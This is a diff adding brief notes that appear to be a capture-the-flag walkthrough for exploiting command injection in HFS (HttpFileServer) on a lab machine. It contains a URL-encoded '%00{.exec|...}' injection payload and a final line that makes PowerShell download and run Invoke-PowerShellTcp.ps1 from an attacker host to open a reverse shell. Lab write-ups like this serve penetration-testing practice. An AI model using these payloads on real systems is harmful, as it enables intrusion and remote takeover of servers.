@@ -1,0 +1,16 @@
+goto address http://10.129.147.35 OR http://IP_ADDRESS
+
+look around, notice HFS, look for HFS scripting commands
+
+use input field, use burp for request interception,
+
+for test,
+
+setup a tcp dump using, `tcpdump -i tun0`
+payload = '%00%7B.exec%7Cping%2010.10.17.144' which is url encoded version of '%00{.exec|ping IP_ADDRESS'
+
+notice ping back from IP_ADDRESS
+got command execution.
+
+
+%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.17.144:8000/Invoke-PowerShellTcp.ps1').}
